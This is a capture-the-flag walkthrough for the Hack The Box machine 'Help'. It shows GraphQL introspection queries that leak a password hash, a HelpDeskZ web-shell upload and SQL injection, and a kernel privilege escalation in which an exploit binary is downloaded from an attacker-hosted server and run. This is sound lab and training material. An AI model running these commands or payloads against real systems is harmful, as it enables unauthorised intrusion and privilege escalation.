# Hack The Box: Help

**Difficulty:** Easy
**OS:** Linux

Help is an Easy-level Linux machine that introduces GraphQL API enumeration to bypass logic flows and recover hidden credentials. These credentials are used to access a HelpDeskZ support portal. Initial access is achieved either through an authenticated SQL injection vulnerability within HelpDeskZ or by abusing an arbitrary file upload flaw. Privilege escalation highlights the importance of kernel patching, as the system is vulnerable to a known kernel exploit.

---

## Reconnaissance

The assessment begins with a port scan of the target machine using `nmap`.

```bash
nmap -p- --min-rate 10000 10.10.10.121
nmap -sC -sV -p 22,80,3000 10.10.10.121
```

The scan identifies the following open ports:
*   **Port 22:** SSH (OpenSSH 7.2p2 Ubuntu)
*   **Port 80:** HTTP (Apache 2.4.18)
*   **Port 3000:** HTTP (Node.js Express framework)

### Port 80 Enumeration
Navigating to port 80 reveals a default Apache Ubuntu page. Running directory enumeration tools such as `gobuster` discovers a `/support` endpoint.

```bash
gobuster dir -u http://10.10.10.121 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

The `/support` directory hosts an instance of HelpDeskZ. Accessing `/support/readme.html` reveals the software version is 1.0.2. A search via `searchsploit` indicates that this version is vulnerable to both an authenticated SQL injection and an arbitrary file upload flaw. However, exploiting either effectively requires interaction with the portal.

### Port 3000 Enumeration
Accessing port 3000 displays a JSON message: `{"message":"Hi Shiv, To get access please find the credentials with given query"}`. 

Given the hint regarding a "query" and the JSON format, the application is likely running a GraphQL API. Testing the endpoint `/graphql` returns a valid GraphQL schema error rather than a 404, confirming its presence.

## GraphQL API Exploitation

GraphQL APIs can often be enumerated via introspection queries if the developer has not explicitly disabled them. We use `curl` to query the API and map its schema.

First, we query the schema types:
```bash
curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __schema { types { name } } }" }' | jq
```
The output reveals a `User` type.

Next, we query the fields associated with the `User` type:
```bash
curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __type(name: \"User\") { name fields { name } } }" }' | jq
```
This reveals two fields: `username` and `password`.

Finally, we construct a query to extract the data from these fields:
```bash
curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ user { username password } }" }' | jq
```

The API responds with valid credentials:
```json
{
  "data": {
    "user": {
      "username": "helpme@helpme.com",
      "password": "5d3c93182bb20f07b994a7f617e99cff"
    }
  }
}
```
The password is provided as an MD5 hash. Using a service like CrackStation or a local cracking tool like Hashcat, the hash is quickly reversed to the plaintext password `godhelpmeplz`.

## Initial Access

We use the recovered credentials (`helpme@helpme.com:godhelpmeplz`) to authenticate into the HelpDeskZ portal on port 80.

With authenticated access, there are two primary vectors for obtaining a shell.

### Method 1: Arbitrary File Upload (CVE-2016-10708)
HelpDeskZ 1.0.2 contains a flaw in its file upload mechanism when submitting support tickets. The application verifies file extensions but fails to randomize the uploaded filename securely; it bases the filename on an MD5 hash of the upload time.

We can submit a ticket and upload a PHP web shell (e.g., `shell.php`). Since the application relies on the system time to generate the filename, we can write a script to calculate the MD5 hash of the current Unix timestamp (adjusting for server timezone differences) and brute-force the predictable URL of the uploaded web shell.

Once the correct URL is hit, the PHP code executes, providing a reverse shell.

### Method 2: Authenticated SQL Injection
Alternatively, HelpDeskZ is vulnerable to an authenticated SQL injection. Using a tool like `sqlmap` against a vulnerable parameter (such as `id`), we can dump the database.

The database dump reveals another user account (`help`) and a corresponding password hash. Cracking this hash yields the credentials for the system user `help`, allowing us to authenticate directly via SSH.

```bash
ssh help@10.10.10.121
# Authentication successful
```
We retrieve the `user.txt` flag.

## Privilege Escalation

Enumerating the system as the user `help` reveals it is running an older Linux kernel.

```bash
uname -a
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

This specific kernel version is vulnerable to several well-known local privilege escalation (LPE) exploits. Searching Exploit-DB for kernel 4.4.0-116 reveals it is vulnerable to CVE-2017-16995 (an eBPF/bpf privilege escalation).

We download the exploit code (e.g., `44298.c` from Exploit-DB) to our attacking machine, compile it, and transfer the binary to the target machine.

```bash
# On attacking machine
gcc 44298.c -o exploit
python3 -m http.server 80

# On target machine
wget http://10.10.14.X/exploit
chmod +x exploit
./exploit
```

Executing the binary successfully escalates privileges to root.

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```
The system is fully compromised, and the `root.txt` flag is obtained.
